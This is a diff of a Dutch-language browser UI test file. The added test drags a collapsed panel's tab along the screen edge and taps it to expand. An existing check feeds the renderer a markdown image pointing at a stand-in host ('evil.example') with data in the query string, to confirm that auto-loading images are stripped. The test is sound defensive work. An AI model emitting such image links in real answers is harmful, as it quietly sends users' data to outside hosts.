@@ -80,6 +80,22 @@ for (const [naam, vp] of [["computer", { width: 1440, height: 900 }], ["telefoon
   ok(schakelaars.includes("2× KLAPPEN") && schakelaars.includes("WERKMODUS"), `${naam}: schakelaars 2× KLAPPEN en WERKMODUS (${schakelaars.join(", ")})`);
   ok(!schakelaars.some((s) => /HÉ ECO/.test(s)), `${naam}: geen "Hé ECO"-schakelaar meer`);
 
+  // Ingeklapt paneel: het lipje is langs de rand te verslepen, ook naar de andere kant, en tikken klapt uit
+  if (naam === "computer") {
+    await page.evaluate(() => { document.getElementById("boot")?.remove(); initLayout(); dock(document.querySelector('[data-win="bediening"]'), "l"); });
+    const lipje = page.locator("#dockL button");
+    const b = await lipje.boundingBox();
+    await page.mouse.move(b.x + b.width / 2, b.y + b.height / 2); await page.mouse.down();
+    await page.mouse.move(b.x + 8, 700, { steps: 5 }); await page.mouse.up();
+    const na = await lipje.boundingBox();
+    ok(Math.abs(na.y + na.height / 2 - 700) < 3, `lipje omlaag gesleept (${Math.round(b.y)} → ${Math.round(na.y)})`);
+    ok(await page.$eval('[data-win="bediening"]', (w) => w.classList.contains("docked")), "slepen klapt niet uit");
+    await page.mouse.move(na.x + 8, 700); await page.mouse.down(); await page.mouse.move(1400, 300, { steps: 5 }); await page.mouse.up();
+    ok(await page.$("#dockR button"), "naar de rechterrand gesleept");
+    await page.click("#dockR button");
+    ok(!(await page.$eval('[data-win="bediening"]', (w) => w.classList.contains("docked"))), "tikken klapt uit");
+  }
+
   // Antwoorden: geen plaatjes die vanzelf laden (zouden gegevens naar buiten kunnen sturen), tekst en links blijven
   const html = await page.evaluate(() => md("Klaar. ![x](https://evil.example/p.png?d=agenda) [bron](https://nos.nl)"));
   ok(!/<img/i.test(html) && /href="https:\/\/nos\.nl"/.test(html) && /Klaar\./.test(html), `${naam}: antwoord zonder plaatje, wel tekst en link`);
